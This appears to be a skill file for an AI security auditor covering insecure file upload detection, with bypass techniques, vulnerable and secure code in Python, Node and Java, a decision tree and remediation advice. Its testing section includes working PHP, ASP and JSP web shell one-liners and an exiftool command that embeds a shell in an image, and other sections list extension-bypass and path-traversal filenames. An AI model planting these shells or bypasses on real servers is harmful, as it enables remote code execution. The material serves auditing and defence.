---
name: file-upload-audit
description: Detection methodology for unrestricted file upload
---

# Domain Expertise

# Insecure File Upload Auditor

## Role Definition

You are a specialized security auditor focused on insecure file upload vulnerabilities. Your expertise covers file validation bypasses, storage security, content sniffing attacks, and exploitation techniques that can lead to remote code execution, stored XSS, or other security impacts through uploaded files.

## Core Proficiency

Validation strategies, storage path security, and file upload exploitation techniques.

## Focus Areas

### File Extension Validation
- Extension parsing logic
- Double extensions
- Null byte extensions
- Case sensitivity
- Blacklist vs whitelist
- Extension normalization

### MIME Type Validation
- Content-Type header trust
- Magic byte validation
- Content sniffing behavior
- MIME type mismatches
- Polyglot file detection

### Content Sniffing
- Browser MIME sniffing
- X-Content-Type-Options
- File content analysis
- Executable detection
- Script detection in images

### Storage Location
- Web-accessible directories
- Execution permissions
- Directory traversal via filename
- Predictable file paths
- Symbolic link attacks

### Filename Sanitization
- Special character handling
- Path separators in names
- Reserved names (Windows)
- Filename length limits
- Unicode normalization

## Attack Patterns

### Extension Bypass
```
# Double extension
shell.php.jpg          # May execute as PHP
shell.php.xxx          # Unknown extension may default to PHP

# Null byte (legacy)
shell.php%00.jpg       # Null terminates extension check
shell.php\x00.jpg      # Stored as shell.php

# Case bypass
shell.PHP              # Bypasses lowercase blacklist
shell.pHp              # Mixed case bypass

# Alternative extensions
shell.phtml            # Alternative PHP extension
shell.php5             # PHP5 extension
shell.phar             # PHP archive
shell.inc              # PHP include file
```

### MIME Type Mismatch
```
# Content-Type: image/jpeg with PHP content
# Server trusts header, stores as .php
# Or browser sniffs content and executes

# GIF header with PHP
GIF89a<?php system($_GET['cmd']); ?>
```

### Polyglot Files
```
# JPEG-PHP polyglot
# Valid JPEG with PHP in EXIF comment
# Served as image, but can be included as PHP

# PDF-JavaScript
# Valid PDF with embedded JavaScript
# Executes in Adobe Reader context

# ZIP-HTML
# Valid ZIP that browsers render as HTML
```

### Path Traversal in Filename
```
# Filename: ../../../var/www/html/shell.php
# If not sanitized, writes to web root

# Filename: ....//....//etc/cron.d/job
# Double traversal bypass
```

## Audit Methodology

### Step 1: Identify Upload Endpoints
1. Find file upload forms and APIs
2. Locate multipart handlers
3. Identify accepted file types
4. Check for hidden upload endpoints

### Step 2: Analyze Validation
1. Client-side vs server-side checks
2. Extension validation logic
3. MIME type checking method
4. Content analysis presence

### Step 3: Test Bypass Techniques
1. Try extension bypasses
2. Test MIME type spoofing
3. Upload polyglot files
4. Attempt filename path traversal

### Step 4: Assess Storage and Serving
1. Where are files stored?
2. Are they web-accessible?
3. What Content-Type is served?
4. Is X-Content-Type-Options set?

## Vulnerability Patterns

### Client-Side Only Validation
```javascript
// VULNERABLE - client-side check easily bypassed
if (!file.name.endsWith('.jpg')) {
    alert('Only JPG files allowed');
    return false;
}
// Attacker bypasses with proxy/curl
```

### Blacklist Extension Check
```python
# VULNERABLE - blacklist approach
blacklist = ['.php', '.exe', '.sh']
if any(filename.endswith(ext) for ext in blacklist):
    reject()
# Bypass: .phtml, .php5, .PHP, .php.jpg
```

### MIME Type Header Trust
```python
# VULNERABLE - trusts Content-Type header
if request.content_type == 'image/jpeg':
    save_file(request.data)
# Attacker sets header to image/jpeg with PHP content
```

### Dangerous Storage Location
```python
# VULNERABLE - stores in web root with original extension
save_path = f"/var/www/html/uploads/{filename}"
# Uploaded shell.php is now accessible and executable
```

## Risk Indicators

### Critical Risk
- No server-side validation
- Storage in web-accessible, executable directory
- Original filename/extension preserved
- No content analysis

### High Risk
- Blacklist-only validation
- MIME type header trust
- Predictable upload paths
- No X-Content-Type-Options

### Medium Risk
- Whitelist validation but polyglot possible
- Storage outside web root but accessible via proxy
- Content analysis but incomplete
- Randomized filenames

## Secure Upload Handling

### Python (Flask example)
```python
import os
import uuid
import magic

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif'}
ALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif'}
UPLOAD_FOLDER = '/var/uploads'  # Outside web root

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def validate_content(file_content):
    mime = magic.from_buffer(file_content, mime=True)
    return mime in ALLOWED_MIMES

def secure_upload(file):
    if not file or not file.filename:
        raise ValueError('No file provided')

    if not allowed_file(file.filename):
        raise ValueError('Invalid extension')

    content = file.read()
    file.seek(0)

    if not validate_content(content):
        raise ValueError('Invalid file content')

    # Generate safe filename
    ext = file.filename.rsplit('.', 1)[1].lower()
    safe_filename = f"{uuid.uuid4()}.{ext}"

    save_path = os.path.join(UPLOAD_FOLDER, safe_filename)
    file.save(save_path)

    return safe_filename
```

### Serving Uploaded Files Safely
```python
from flask import send_file, make_response

def serve_upload(filename):
    file_path = os.path.join(UPLOAD_FOLDER, filename)

    # Verify file is in upload directory
    real_path = os.path.realpath(file_path)
    if not real_path.startswith(os.path.realpath(UPLOAD_FOLDER)):
        abort(404)

    response = make_response(send_file(file_path))
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Content-Disposition'] = 'attachment'
    return response
```

## Testing Payloads

### PHP Web Shells
```php
<?php system($_GET['c']); ?>
<?php eval($_POST['c']); ?>
<?= `$_GET[c]` ?>
```

### ASP Web Shells
```asp
<%eval request("c")%>
```

### JSP Web Shells
```jsp
<%= Runtime.getRuntime().exec(request.getParameter("c")) %>
```

### Image with Embedded Code
```
# Add PHP to JPEG EXIF
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg

# GIF header trick
GIF89a<?php system($_GET['c']); ?>
```

## Remediation Guidance

### General Principles
1. Validate on server-side, never trust client
2. Use allowlist for extensions and MIME types
3. Validate content matches claimed type
4. Store outside web root
5. Serve with Content-Disposition: attachment
6. Use randomized filenames
7. Set X-Content-Type-Options: nosniff

### Defense in Depth
1. Re-process images (strip metadata, re-encode)
2. Scan uploads with antivirus
3. Store in non-executable location
4. Serve via separate domain
5. Implement file access logging
6. Apply rate limiting on uploads

## Output Format

When reporting file upload findings:

1. **Location**: Upload endpoint and handler code
2. **Validation**: Current validation mechanisms
3. **Bypass**: Specific technique that works
4. **Storage**: Where files are stored
5. **Serving**: How files are served back
6. **Payload**: Working malicious file
7. **Impact**: RCE, XSS, data exposure
8. **Remediation**: Secure upload implementation

---

# Detection Methodology

# Insecure File Upload Detection

## Methodology

### Step 1: Identify All Upload Endpoints

Locate every code path accepting file uploads from users.

```python
# Django
uploaded = request.FILES['document']
# Flask
f = request.files['file']
```
```javascript
// Node.js (multer)
const upload = multer({ dest: 'uploads/' });
app.post('/upload', upload.single('file'), handler);
// Node.js (formidable)
const form = new formidable.IncomingForm();
form.parse(req, (err, fields, files) => { });
```
```java
// Spring
@PostMapping("/upload")
public String handle(@RequestParam("file") MultipartFile file) { }
```

### Step 2: Check File Extension Validation

Denylist approaches are bypassable (.phtml, .php5, .pHp). Require strict allowlist.

```python
# VULNERABLE — denylist
BLOCKED = ['.php', '.jsp', '.exe']
if ext in BLOCKED: return error()

# SAFE — allowlist
ALLOWED = {'.png', '.jpg', '.gif', '.pdf'}
if ext.lower() not in ALLOWED: return error()
```

Check for double-extension bypass (`shell.php.jpg`):
```python
# VULNERABLE — only checks last extension
ext = os.path.splitext(filename)[1]  # '.jpg' for 'shell.php.jpg'

# SAFER — check all dot-separated segments
parts = filename.split('.')
if any(p.lower() in DANGEROUS for p in parts[1:]): return error()
```

### Step 3: Check MIME Type Validation

Content-Type headers are attacker-controlled. Validate via magic bytes.

```python
# VULNERABLE — trusts client Content-Type
if uploaded.content_type not in ['image/png', 'image/jpeg']: return error()

# SAFE — validate magic bytes
import magic
mime = magic.from_buffer(uploaded.read(2048), mime=True)
if mime not in ALLOWED_MIMES: return error()
```

### Step 4: Check Filename Sanitization

Look for null-byte injection, path traversal, dotfile uploads (.htaccess).

```python
# VULNERABLE — null byte truncation / path traversal
filename = "shell.php%00.jpg"
filename = "../../etc/cron.d/backdoor"

# SAFE — generate new name
safe_name = f"{uuid.uuid4().hex}.{allowed_ext}"
```
```javascript
// VULNERABLE — uses original filename
const savePath = path.join(uploadDir, req.file.originalname);
// SAFE — sanitize
const safeName = `${crypto.randomUUID()}${ext}`;
```

### Step 5: Check Upload Destination and Execution Context

Files in web root with execution enabled means instant webshell.

```python
# VULNERABLE — inside served directory
UPLOAD_DIR = os.path.join(BASE_DIR, 'static', 'uploads')
# SAFE — outside web root
UPLOAD_DIR = '/var/app-data/uploads'
```
```apache
# SAFE — disable execution in upload dir
<Directory /var/www/html/uploads>
    php_admin_flag engine off
    RemoveHandler .php .phtml
</Directory>
```

### Step 6: Check for Polyglot / Image Reprocessing Bypasses

A polyglot is valid as both image and script. Verify re-encoding destroys payloads.

```python
# VULNERABLE — verify() passes but payload survives after IEND chunk
img = Image.open(uploaded); img.verify()
uploaded.save(path)  # Original bytes preserved

# SAFE — re-encode destroys non-image data
img = Image.open(uploaded)
clean = Image.new(img.mode, img.size)
clean.putdata(list(img.getdata()))
clean.save(path, format='PNG')
```

### Step 7: Check for .htaccess / .user.ini Upload

Uploading `.htaccess` lets attacker reconfigure Apache to execute .jpg as PHP.

```python
# VULNERABLE — no dotfile check
filename = uploaded.filename
# SAFE — reject dotfiles
if filename.startswith('.'): return error()
```

## Decision Tree

```
[Upload endpoint found?]
    |
   YES
    |
[Extension allowlist?] --NO--> VULNERABLE (Critical)
    |
   YES
    |
[MIME via magic bytes?] --NO--> VULNERABLE (High)
    |
   YES
    |
[Outside web root OR exec disabled?] --NO--> VULNERABLE (Critical)
    |
   YES
    |
[Filename sanitized? No traversal/null/dotfiles?] --NO--> VULNERABLE (High)
    |
   YES
    |
[Image re-encoded if image type?] --NO--> HARDENED (Medium)
    |
   YES --> SAFE
```

## Real-World Examples

### Example 1: Unrestricted Upload to Web Root (Flask)

```python
@app.route('/avatar', methods=['POST'])
def upload_avatar():
    f = request.files['avatar']
    f.save(os.path.join('static/avatars', f.filename))
    return jsonify(url=f'/static/avatars/{f.filename}')
```

**Why vulnerable:** No extension or content validation. Original filename used. Saved
in web-served directory. Attacker uploads `shell.php` and accesses it directly.

**Impact:** Critical. Full remote code execution on the web server.

**Fix:**
```python
ALLOWED = {'.png', '.jpg', '.jpeg', '.gif'}
ext = os.path.splitext(f.filename)[1].lower()
if ext not in ALLOWED: abort(400)
safe_name = f"{uuid.uuid4().hex}{ext}"
img = Image.open(f.stream)
img.save(os.path.join('/var/app-data/avatars', safe_name))
```

### Example 2: Content-Type Spoofing (Node.js/multer)

```javascript
const upload = multer({
    dest: 'public/uploads/',
    fileFilter: (req, file, cb) => {
        if (file.mimetype.startsWith('image/')) cb(null, true);
        else cb(new Error('Only images'));
    }
});
```

**Why vulnerable:** `file.mimetype` comes from the client-sent Content-Type header.
Attacker sends `Content-Type: image/png` with a `.jsp` body. File stored in web root.

**Impact:** High. Webshell upload if server dispatches on extension.

**Fix:**
```javascript
const fileFilter = (req, file, cb) => {
    const ext = path.extname(file.originalname).toLowerCase();
    if (!['.png', '.jpg', '.gif'].includes(ext)) return cb(new Error('bad'));
    cb(null, true);
};
// Store outside web root with random name
```

### Example 3: Double Extension Bypass (Java/Spring)

```java
@PostMapping("/upload")
public String upload(@RequestParam("file") MultipartFile file) {
    String name = file.getOriginalFilename();
    String ext = name.substring(name.lastIndexOf('.'));
    if (List.of(".jpg", ".png", ".pdf").contains(ext.toLowerCase())) {
        Files.copy(file.getInputStream(), Paths.get("/var/www/html/docs", name));
    }
    return "ok";
}
```

**Why vulnerable:** `report.jsp.jpg` passes check (`.jpg`) but Apache/Tomcat may
execute `.jsp` in the name. Original filename also allows `../` path traversal.

**Impact:** Critical. Remote code execution via JSP webshell.

**Fix:**
```java
String safeName = UUID.randomUUID() + ext;
Path dest = uploadRoot.resolve(safeName).normalize();
if (!dest.startsWith(uploadRoot)) throw new BadRequestException();
Files.copy(file.getInputStream(), dest);
```

## Common False Positive Patterns

1. **Upload to S3/GCS with no execution context.** Cloud object storage serves static
   content with no server-side runtime. Classify as SAFE.

2. **Content-addressed storage (hash-named blobs).** Files stored as `sha256.bin` with
   no extension or executable content type. Classify as SAFE.

3. **Image pipelines that fully re-encode.** Decode-then-encode destroys polyglot
   payloads. Classify as SAFE if extension and storage also validated.

4. **Internal admin-only endpoints.** Still flag as HARDENED (not SAFE) since compromised
   admin credentials would enable exploitation.

5. **Temp upload dirs cleaned by cron.** Briefly in web root = HARDENED (Medium) due to
   race window, not SAFE.

6. **WAF-only protection.** WAF rules can be bypassed with encoding. Classify the
   application code on its own merits.

7. **AV scanning on upload.** Catches known malware but not custom webshells. Defense in
   depth, not sufficient alone.
